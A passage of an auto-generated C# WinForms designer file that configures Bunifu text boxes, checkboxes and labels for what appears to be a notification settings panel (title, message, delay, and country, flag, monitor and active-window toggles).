        stateProperties110.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties110.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties110.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextDelayNotif.OnDisabledState = stateProperties110;
        stateProperties111.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties111.FillColor = System.Drawing.Color.Empty;
        stateProperties111.ForeColor = System.Drawing.Color.Empty;
        stateProperties111.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextDelayNotif.OnHoverState = stateProperties111;
        stateProperties112.BorderColor = System.Drawing.Color.Silver;
        stateProperties112.FillColor = System.Drawing.Color.White;
        stateProperties112.ForeColor = System.Drawing.Color.Empty;
        stateProperties112.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextDelayNotif.OnIdleState = stateProperties112;
        this.TextDelayNotif.Padding = new System.Windows.Forms.Padding(3);
        this.TextDelayNotif.PasswordChar = '\0';
        this.TextDelayNotif.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextDelayNotif.PlaceholderText = "Delay {3000}.ms";
        this.TextDelayNotif.ReadOnly = false;
        this.TextDelayNotif.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextDelayNotif.SelectedText = "";
        this.TextDelayNotif.SelectionLength = 0;
        this.TextDelayNotif.SelectionStart = 0;
        this.TextDelayNotif.ShortcutsEnabled = true;
        this.TextDelayNotif.Size = new System.Drawing.Size(217, 28);
        this.TextDelayNotif.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextDelayNotif.TabIndex = 603;
        this.TextDelayNotif.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextDelayNotif.TextMarginBottom = 0;
        this.TextDelayNotif.TextMarginLeft = 3;
        this.TextDelayNotif.TextMarginTop = 1;
        this.TextDelayNotif.TextPlaceholder = "Delay {3000}.ms";
        this.TextDelayNotif.UseSystemPasswordChar = false;
        this.TextDelayNotif.WordWrap = true;
        this.TextDelayNotif.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.SpeedNotif_KeyPress);
        // 
        // EnableMonitors
        // 
        this.EnableMonitors.AllowBindingControlAnimation = true;
        this.EnableMonitors.AllowBindingControlColorChanges = false;
        this.EnableMonitors.AllowBindingControlLocation = true;
        this.EnableMonitors.AllowCheckBoxAnimation = true;
        this.EnableMonitors.AllowCheckmarkAnimation = true;
        this.EnableMonitors.AllowOnHoverStates = true;
        this.EnableMonitors.AutoCheck = true;
        this.EnableMonitors.BackColor = System.Drawing.Color.Transparent;
        this.EnableMonitors.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableMonitors.BackgroundImage")));
        this.EnableMonitors.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableMonitors.BindingControl = this.TxMonitors;
        this.EnableMonitors.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableMonitors.BorderRadius = 6;
        this.EnableMonitors.Checked = false;
        this.EnableMonitors.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableMonitors.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableMonitors.CustomCheckmarkImage = null;
        this.EnableMonitors.Location = new System.Drawing.Point(20, 358);
        this.EnableMonitors.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableMonitors.Name = "EnableMonitors";
        this.EnableMonitors.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableMonitors.OnCheck.BorderRadius = 6;
        this.EnableMonitors.OnCheck.BorderThickness = 2;
        this.EnableMonitors.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableMonitors.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableMonitors.OnCheck.CheckmarkThickness = 2;
        this.EnableMonitors.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableMonitors.OnDisable.BorderRadius = 6;
        this.EnableMonitors.OnDisable.BorderThickness = 2;
        this.EnableMonitors.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableMonitors.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableMonitors.OnDisable.CheckmarkThickness = 2;
        this.EnableMonitors.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableMonitors.OnHoverChecked.BorderRadius = 6;
        this.EnableMonitors.OnHoverChecked.BorderThickness = 2;
        this.EnableMonitors.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableMonitors.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableMonitors.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableMonitors.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableMonitors.OnHoverUnchecked.BorderRadius = 6;
        this.EnableMonitors.OnHoverUnchecked.BorderThickness = 1;
        this.EnableMonitors.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableMonitors.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableMonitors.OnUncheck.BorderRadius = 6;
        this.EnableMonitors.OnUncheck.BorderThickness = 1;
        this.EnableMonitors.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableMonitors.Size = new System.Drawing.Size(21, 21);
        this.EnableMonitors.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableMonitors.TabIndex = 648;
        this.EnableMonitors.ThreeState = false;
        this.EnableMonitors.ToolTipText = null;
        this.EnableMonitors.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableMonitors_CheckedChanged);
        // 
        // TextMessageNotif
        // 
        this.TextMessageNotif.AcceptsReturn = false;
        this.TextMessageNotif.AcceptsTab = false;
        this.TextMessageNotif.AnimationSpeed = 200;
        this.TextMessageNotif.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextMessageNotif.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextMessageNotif.AutoSizeHeight = true;
        this.TextMessageNotif.BackColor = System.Drawing.Color.Transparent;
        this.TextMessageNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextMessageNotif.BackgroundImage")));
        this.TextMessageNotif.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextMessageNotif.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextMessageNotif.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextMessageNotif.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextMessageNotif.BorderRadius = 2;
        this.TextMessageNotif.BorderThickness = 1;
        this.TextMessageNotif.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextMessageNotif.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextMessageNotif.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextMessageNotif.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextMessageNotif.DefaultText = "";
        this.TextMessageNotif.FillColor = System.Drawing.Color.White;
        this.TextMessageNotif.HideSelection = true;
        this.TextMessageNotif.IconLeft = null;
        this.TextMessageNotif.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextMessageNotif.IconPadding = 10;
        this.TextMessageNotif.IconRight = null;
        this.TextMessageNotif.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextMessageNotif.Lines = new string[0];
        this.TextMessageNotif.Location = new System.Drawing.Point(389, 81);
        this.TextMessageNotif.MaxLength = 32767;
        this.TextMessageNotif.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextMessageNotif.Modified = false;
        this.TextMessageNotif.Multiline = false;
        this.TextMessageNotif.Name = "TextMessageNotif";
        stateProperties113.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties113.FillColor = System.Drawing.Color.Empty;
        stateProperties113.ForeColor = System.Drawing.Color.Empty;
        stateProperties113.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextMessageNotif.OnActiveState = stateProperties113;
        stateProperties114.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties114.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties114.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties114.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextMessageNotif.OnDisabledState = stateProperties114;
        stateProperties115.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties115.FillColor = System.Drawing.Color.Empty;
        stateProperties115.ForeColor = System.Drawing.Color.Empty;
        stateProperties115.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextMessageNotif.OnHoverState = stateProperties115;
        stateProperties116.BorderColor = System.Drawing.Color.Silver;
        stateProperties116.FillColor = System.Drawing.Color.White;
        stateProperties116.ForeColor = System.Drawing.Color.Empty;
        stateProperties116.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextMessageNotif.OnIdleState = stateProperties116;
        this.TextMessageNotif.Padding = new System.Windows.Forms.Padding(3);
        this.TextMessageNotif.PasswordChar = '\0';
        this.TextMessageNotif.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextMessageNotif.PlaceholderText = "Message";
        this.TextMessageNotif.ReadOnly = false;
        this.TextMessageNotif.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextMessageNotif.SelectedText = "";
        this.TextMessageNotif.SelectionLength = 0;
        this.TextMessageNotif.SelectionStart = 0;
        this.TextMessageNotif.ShortcutsEnabled = true;
        this.TextMessageNotif.Size = new System.Drawing.Size(438, 28);
        this.TextMessageNotif.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextMessageNotif.TabIndex = 602;
        this.TextMessageNotif.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextMessageNotif.TextMarginBottom = 0;
        this.TextMessageNotif.TextMarginLeft = 3;
        this.TextMessageNotif.TextMarginTop = 1;
        this.TextMessageNotif.TextPlaceholder = "Message";
        this.TextMessageNotif.UseSystemPasswordChar = false;
        this.TextMessageNotif.WordWrap = true;
        // 
        // EnableWindowsActive
        // 
        this.EnableWindowsActive.AllowBindingControlAnimation = true;
        this.EnableWindowsActive.AllowBindingControlColorChanges = false;
        this.EnableWindowsActive.AllowBindingControlLocation = true;
        this.EnableWindowsActive.AllowCheckBoxAnimation = true;
        this.EnableWindowsActive.AllowCheckmarkAnimation = true;
        this.EnableWindowsActive.AllowOnHoverStates = true;
        this.EnableWindowsActive.AutoCheck = true;
        this.EnableWindowsActive.BackColor = System.Drawing.Color.Transparent;
        this.EnableWindowsActive.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableWindowsActive.BackgroundImage")));
        this.EnableWindowsActive.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableWindowsActive.BindingControl = this.TxWindowsActive;
        this.EnableWindowsActive.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableWindowsActive.BorderRadius = 6;
        this.EnableWindowsActive.Checked = false;
        this.EnableWindowsActive.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableWindowsActive.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableWindowsActive.CustomCheckmarkImage = null;
        this.EnableWindowsActive.Location = new System.Drawing.Point(189, 277);
        this.EnableWindowsActive.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableWindowsActive.Name = "EnableWindowsActive";
        this.EnableWindowsActive.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableWindowsActive.OnCheck.BorderRadius = 6;
        this.EnableWindowsActive.OnCheck.BorderThickness = 2;
        this.EnableWindowsActive.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableWindowsActive.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableWindowsActive.OnCheck.CheckmarkThickness = 2;
        this.EnableWindowsActive.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableWindowsActive.OnDisable.BorderRadius = 6;
        this.EnableWindowsActive.OnDisable.BorderThickness = 2;
        this.EnableWindowsActive.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableWindowsActive.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableWindowsActive.OnDisable.CheckmarkThickness = 2;
        this.EnableWindowsActive.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableWindowsActive.OnHoverChecked.BorderRadius = 6;
        this.EnableWindowsActive.OnHoverChecked.BorderThickness = 2;
        this.EnableWindowsActive.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableWindowsActive.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableWindowsActive.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableWindowsActive.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableWindowsActive.OnHoverUnchecked.BorderRadius = 6;
        this.EnableWindowsActive.OnHoverUnchecked.BorderThickness = 1;
        this.EnableWindowsActive.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableWindowsActive.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableWindowsActive.OnUncheck.BorderRadius = 6;
        this.EnableWindowsActive.OnUncheck.BorderThickness = 1;
        this.EnableWindowsActive.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableWindowsActive.Size = new System.Drawing.Size(21, 21);
        this.EnableWindowsActive.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableWindowsActive.TabIndex = 644;
        this.EnableWindowsActive.ThreeState = false;
        this.EnableWindowsActive.ToolTipText = null;
        this.EnableWindowsActive.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableUsername_CheckedChanged);
        // 
        // TextTitleNotif
        // 
        this.TextTitleNotif.AcceptsReturn = false;
        this.TextTitleNotif.AcceptsTab = false;
        this.TextTitleNotif.AnimationSpeed = 200;
        this.TextTitleNotif.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextTitleNotif.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextTitleNotif.AutoSizeHeight = true;
        this.TextTitleNotif.BackColor = System.Drawing.Color.Transparent;
        this.TextTitleNotif.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextTitleNotif.BackgroundImage")));
        this.TextTitleNotif.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextTitleNotif.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextTitleNotif.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextTitleNotif.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextTitleNotif.BorderRadius = 2;
        this.TextTitleNotif.BorderThickness = 1;
        this.TextTitleNotif.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextTitleNotif.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextTitleNotif.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextTitleNotif.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextTitleNotif.DefaultText = "";
        this.TextTitleNotif.FillColor = System.Drawing.Color.White;
        this.TextTitleNotif.HideSelection = true;
        this.TextTitleNotif.IconLeft = null;
        this.TextTitleNotif.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextTitleNotif.IconPadding = 10;
        this.TextTitleNotif.IconRight = null;
        this.TextTitleNotif.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextTitleNotif.Lines = new string[0];
        this.TextTitleNotif.Location = new System.Drawing.Point(389, 47);
        this.TextTitleNotif.MaxLength = 32767;
        this.TextTitleNotif.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextTitleNotif.Modified = false;
        this.TextTitleNotif.Multiline = false;
        this.TextTitleNotif.Name = "TextTitleNotif";
        stateProperties117.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties117.FillColor = System.Drawing.Color.Empty;
        stateProperties117.ForeColor = System.Drawing.Color.Empty;
        stateProperties117.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextTitleNotif.OnActiveState = stateProperties117;
        stateProperties118.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties118.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties118.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties118.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextTitleNotif.OnDisabledState = stateProperties118;
        stateProperties119.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties119.FillColor = System.Drawing.Color.Empty;
        stateProperties119.ForeColor = System.Drawing.Color.Empty;
        stateProperties119.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextTitleNotif.OnHoverState = stateProperties119;
        stateProperties120.BorderColor = System.Drawing.Color.Silver;
        stateProperties120.FillColor = System.Drawing.Color.White;
        stateProperties120.ForeColor = System.Drawing.Color.Empty;
        stateProperties120.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextTitleNotif.OnIdleState = stateProperties120;
        this.TextTitleNotif.Padding = new System.Windows.Forms.Padding(3);
        this.TextTitleNotif.PasswordChar = '\0';
        this.TextTitleNotif.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextTitleNotif.PlaceholderText = "Title";
        this.TextTitleNotif.ReadOnly = false;
        this.TextTitleNotif.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextTitleNotif.SelectedText = "";
        this.TextTitleNotif.SelectionLength = 0;
        this.TextTitleNotif.SelectionStart = 0;
        this.TextTitleNotif.ShortcutsEnabled = true;
        this.TextTitleNotif.Size = new System.Drawing.Size(438, 28);
        this.TextTitleNotif.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextTitleNotif.TabIndex = 601;
        this.TextTitleNotif.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextTitleNotif.TextMarginBottom = 0;
        this.TextTitleNotif.TextMarginLeft = 3;
        this.TextTitleNotif.TextMarginTop = 1;
        this.TextTitleNotif.TextPlaceholder = "Title";
        this.TextTitleNotif.UseSystemPasswordChar = false;
        this.TextTitleNotif.WordWrap = true;
        // 
        // pictureBox5
        // 
        this.pictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox5.Image")));
        this.pictureBox5.Location = new System.Drawing.Point(226, 107);
        this.pictureBox5.Name = "pictureBox5";
        this.pictureBox5.Size = new System.Drawing.Size(136, 62);
        this.pictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox5.TabIndex = 643;
        this.pictureBox5.TabStop = false;
        // 
        // label10
        // 
        this.label10.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label10.AutoSize = true;
        this.label10.BackColor = System.Drawing.Color.Transparent;
        this.label10.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label10.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label10.ForeColor = System.Drawing.Color.Gray;
        this.label10.Location = new System.Drawing.Point(289, 47);
        this.label10.Name = "label10";
        this.label10.Size = new System.Drawing.Size(39, 15);
        this.label10.TabIndex = 642;
        this.label10.Text = "Speed";
        // 
        // label9
        // 
        this.label9.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label9.AutoSize = true;
        this.label9.BackColor = System.Drawing.Color.Transparent;
        this.label9.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label9.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label9.ForeColor = System.Drawing.Color.Gray;
        this.label9.Location = new System.Drawing.Point(153, 47);
        this.label9.Name = "label9";
        this.label9.Size = new System.Drawing.Size(27, 15);
        this.label9.TabIndex = 641;
        this.label9.Text = "Out";
        // 
        // TxCountry
        // 
        this.TxCountry.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxCountry.AutoSize = true;
        this.TxCountry.BackColor = System.Drawing.Color.Transparent;
        this.TxCountry.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxCountry.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxCountry.ForeColor = System.Drawing.Color.Black;
        this.TxCountry.Location = new System.Drawing.Point(213, 254);
        this.TxCountry.Name = "TxCountry";
        this.TxCountry.Size = new System.Drawing.Size(88, 15);
        this.TxCountry.TabIndex = 643;
        this.TxCountry.Text = "Enable Country";
        // 
        // EnableCountry
        // 
        this.EnableCountry.AllowBindingControlAnimation = true;
        this.EnableCountry.AllowBindingControlColorChanges = false;
        this.EnableCountry.AllowBindingControlLocation = true;
        this.EnableCountry.AllowCheckBoxAnimation = true;
        this.EnableCountry.AllowCheckmarkAnimation = true;
        this.EnableCountry.AllowOnHoverStates = true;
        this.EnableCountry.AutoCheck = true;
        this.EnableCountry.BackColor = System.Drawing.Color.Transparent;
        this.EnableCountry.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableCountry.BackgroundImage")));
        this.EnableCountry.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableCountry.BindingControl = this.TxCountry;
        this.EnableCountry.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableCountry.BorderRadius = 6;
        this.EnableCountry.Checked = false;
        this.EnableCountry.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableCountry.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableCountry.CustomCheckmarkImage = null;
        this.EnableCountry.Location = new System.Drawing.Point(189, 250);
        this.EnableCountry.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableCountry.Name = "EnableCountry";
        this.EnableCountry.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableCountry.OnCheck.BorderRadius = 6;
        this.EnableCountry.OnCheck.BorderThickness = 2;
        this.EnableCountry.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableCountry.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnableCountry.OnCheck.CheckmarkThickness = 2;
        this.EnableCountry.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnableCountry.OnDisable.BorderRadius = 6;
        this.EnableCountry.OnDisable.BorderThickness = 2;
        this.EnableCountry.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableCountry.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnableCountry.OnDisable.CheckmarkThickness = 2;
        this.EnableCountry.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableCountry.OnHoverChecked.BorderRadius = 6;
        this.EnableCountry.OnHoverChecked.BorderThickness = 2;
        this.EnableCountry.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.EnableCountry.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnableCountry.OnHoverChecked.CheckmarkThickness = 2;
        this.EnableCountry.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.EnableCountry.OnHoverUnchecked.BorderRadius = 6;
        this.EnableCountry.OnHoverUnchecked.BorderThickness = 1;
        this.EnableCountry.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnableCountry.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnableCountry.OnUncheck.BorderRadius = 6;
        this.EnableCountry.OnUncheck.BorderThickness = 1;
        this.EnableCountry.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnableCountry.Size = new System.Drawing.Size(21, 21);
        this.EnableCountry.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnableCountry.TabIndex = 642;
        this.EnableCountry.ThreeState = false;
        this.EnableCountry.ToolTipText = null;
        this.EnableCountry.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.EnableCountry_CheckedChanged);
        // 
        // label7
        // 
        this.label7.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label7.AutoSize = true;
        this.label7.BackColor = System.Drawing.Color.Transparent;
        this.label7.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label7.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label7.ForeColor = System.Drawing.Color.Gray;
        this.label7.Location = new System.Drawing.Point(20, 47);
        this.label7.Name = "label7";
        this.label7.Size = new System.Drawing.Size(37, 15);
        this.label7.TabIndex = 640;
        this.label7.Text = "Login";
        // 
        // CountScroolForm
        // 
        this.CountScroolForm.AllowParentOverrides = false;
        this.CountScroolForm.AutoEllipsis = false;
        this.CountScroolForm.CursorType = null;
        this.CountScroolForm.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.CountScroolForm.ForeColor = System.Drawing.Color.DarkGray;
        this.CountScroolForm.Location = new System.Drawing.Point(20, 169);
        this.CountScroolForm.Name = "CountScroolForm";
        this.CountScroolForm.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.CountScroolForm.Size = new System.Drawing.Size(108, 15);
        this.CountScroolForm.TabIndex = 639;
        this.CountScroolForm.Text = "Curvature(max) 60%";
        this.CountScroolForm.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.CountScroolForm.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // EnableFlag
        // 
        this.EnableFlag.AllowBindingControlAnimation = true;
        this.EnableFlag.AllowBindingControlColorChanges = false;
        this.EnableFlag.AllowBindingControlLocation = true;
        this.EnableFlag.AllowCheckBoxAnimation = true;
        this.EnableFlag.AllowCheckmarkAnimation = true;
        this.EnableFlag.AllowOnHoverStates = true;
        this.EnableFlag.AutoCheck = true;
        this.EnableFlag.BackColor = System.Drawing.Color.Transparent;
        this.EnableFlag.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("EnableFlag.BackgroundImage")));
        this.EnableFlag.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnableFlag.BindingControl = this.TxFlag;
        this.EnableFlag.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnableFlag.BorderRadius = 6;
        this.EnableFlag.Checked = false;
        this.EnableFlag.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnableFlag.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnableFlag.CustomCheckmarkImage = null;
        this.EnableFlag.Location = new System.Drawing.Point(20, 331);
        this.EnableFlag.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnableFlag.Name = "EnableFlag";
